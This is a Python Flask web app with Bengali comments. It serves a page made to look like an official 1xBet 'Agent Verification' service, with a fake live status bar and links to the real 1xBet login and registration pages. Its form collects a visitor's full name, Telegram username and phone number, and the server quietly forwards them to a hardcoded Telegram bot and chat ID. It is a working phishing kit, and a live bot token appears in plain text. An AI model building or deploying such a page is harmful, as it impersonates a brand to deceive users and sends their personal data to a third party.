from flask import Flask, render_template_string, request, jsonify
import os, requests

app = Flask(__name__)

# টেলিগ্রাম কনফিগারেশন
P1 = "8540257283"
P2 = "AAEqTBD6kJSVozsKmWtZf_l-QQtkJtUuTw"
BOT_TOKEN = f"{P1}:{P2}"
MY_CHAT_ID = "6529319833"

@app.route('/')
def home():
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>xCare Official</title>
        <style>
            body { font-family: 'Segoe UI', sans-serif; background-color: #0b162c; color: white; margin: 0; padding: 0; }
            
            /* টপ বার (অফিসিয়াল লুক) */
            .top-nav {
                display: flex; justify-content: space-between; align-items: center;
                padding: 15px 20px; background: #162641; border-bottom: 1px solid #253959;
            }
            .brand-name { font-weight: bold; font-size: 20px; color: #fff; letter-spacing: 1px; }
            .nav-buttons { display: flex; gap: 10px; }
            
            /* 1xBet স্টাইল বাটন */
            .btn-nav {
                padding: 8px 18px; border-radius: 6px; text-decoration: none;
                font-weight: 600; font-size: 13px; transition: 0.2s; border: none;
            }
            .btn-login { background: #34495e; color: white; } /* লগইন বাটন */
            .btn-reg { background: #60a12e; color: white; }   /* রেজিস্ট্রেশন বাটন (সবুজ) */
            .btn-nav:active { transform: scale(0.95); }

            .container { padding: 20px; }
            
            /* CSS লোগো */
            .logo-section { text-align: center; margin: 30px 0; }
            .custom-logo {
                width: 80px; height: 80px; background: linear-gradient(135deg, #1976d2, #0d47a1);
                border-radius: 18px; display: flex; align-items: center; justify-content: center;
                margin: 0 auto; font-size: 32px; font-weight: bold; color: white;
                box-shadow: 0 0 20px rgba(25, 118, 210, 0.3); border: 2px solid rgba(255, 255, 255, 0.1);
            }

            .status-bar { display: flex; justify-content: space-between; font-size: 10px; color: #8fa3bf; margin-bottom: 25px; text-transform: uppercase; border-top: 1px solid #1c2e4a; padding-top: 20px; }
            .online { color: #4caf50; font-weight: bold; }
            
            .section-label { font-size: 11px; color: #8fa3bf; text-transform: uppercase; margin: 25px 0 12px 0; display: block; letter-spacing: 1px; }
            
            /* কার্ড ডিজাইন */
            .card { background: #162641; padding: 18px; border-radius: 15px; display: flex; align-items: center; margin-bottom: 12px; cursor: pointer; border: 1px solid #1c2e4a; text-decoration: none; color: white; }
            .card-icon { width: 42px; height: 42px; background: rgba(25, 118, 210, 0.1); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin-right: 15px; border: 1px solid #1976d2; color: #1976d2; font-weight: bold; }
            .card-info b { display: block; font-size: 15px; }
            .card-info span { font-size: 11px; color: #4caf50; }
            .arrow { margin-left: auto; color: #1976d2; font-size: 18px; }

            /* ফর্ম শিট */
            .overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; backdrop-filter: blur(4px); }
            .bottom-sheet { position: fixed; bottom: -100%; left: 0; width: 100%; background: #0b162c; border-radius: 25px 25px 0 0; padding: 30px 20px; box-sizing: border-box; z-index: 200; border-top: 3px solid #1976d2; transition: 0.4s ease; }
            .bottom-sheet.show { bottom: 0; }
            .submit-btn { background: #1976d2; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-weight: bold; cursor: pointer; margin-top: 15px; }
            .input-box { margin-bottom: 15px; }
            .input-box input { width: 100%; padding: 14px; background: #162641; border: 1px solid #253959; border-radius: 10px; color: white; box-sizing: border-box; outline: none; }
        </style>
    </head>
    <body>
        <div class="top-nav">
            <div class="brand-name">1XBET</div>
            <div class="nav-buttons">
                <a href="https://1xbet.com/en/user/login" class="btn-nav btn-login">Log in</a>
                <a href="https://1xbet.com/en/registration" class="btn-nav btn-reg">Registration</a>
            </div>
        </div>

        <div class="logo-section">
            <div class="custom-logo">xC</div>
        </div>

        <div class="container">
            <div class="status-bar">
                <span class="online">● System: Live</span>
                <span>ID: 1XB-7729-MS</span>
            </div>

            <span class="section-label">Verified Services</span>
            <div class="card" onclick="openForm('1xBet Master Agent')">
                <div class="card-icon">xC</div>
                <div class="card-info"><b>Agent Verification</b><span>Link your official account</span></div>
                <div class="arrow">➔</div>
            </div>

            <a href="https://t.me/Your_Affiliate_Support" class="card">
                <div class="card-icon">TG</div>
                <div class="card-info"><b>Affiliate Support</b><span>24/7 Official Support</span></div>
                <div class="arrow">↗</div>
            </a>
        </div>

        <div class="overlay" id="overlay" onclick="closeForm()"></div>
        <div class="bottom-sheet" id="sheet">
            <h4 id="f_title" style="color: #1976d2; margin-bottom: 20px; text-align: center;">VERIFICATION FORM</h4>
            <form id="reqForm">
                <input type="hidden" name="type" id="f_type">
                <div class="input-box"><input type="text" name="name" placeholder="Full Name" required></div>
                <div class="input-box"><input type="text" name="tg" placeholder="Telegram Username" required></div>
                <div class="input-box"><input type="text" name="ph" placeholder="Phone/WhatsApp Number" required></div>
                <button type="submit" class="submit-btn" id="s_btn">LINK ACCOUNT</button>
            </form>
        </div>

        <script>
            function openForm(v) {
                document.getElementById('f_type').value = v;
                document.getElementById('overlay').style.display = 'block';
                document.getElementById('sheet').classList.add('show');
            }
            function closeForm() {
                document.getElementById('sheet').classList.remove('show');
                setTimeout(() => { document.getElementById('overlay').style.display = 'none'; }, 400);
            }
            document.getElementById('reqForm').onsubmit = async (e) => {
                e.preventDefault();
                document.getElementById('s_btn').innerText = 'PROCCESSING...';
                const d = Object.fromEntries(new FormData(e.target));
                const res = await fetch('/api/request', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(d)
                });
                if(res.ok) { alert('Verification Submitted!'); location.reload(); }
            };
        </script>
    </body>
    </html>
    ''')

@app.route('/api/request', methods=['POST'])
def request_api():
    d = request.json
    msg = f"✅ **Account Link Request**\n\n👤 Name: {d.get('name')}\n🆔 TG: {d.get('tg')}\n📱 Ph: {d.get('ph')}"
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": MY_CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    return jsonify({"ok": True})

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
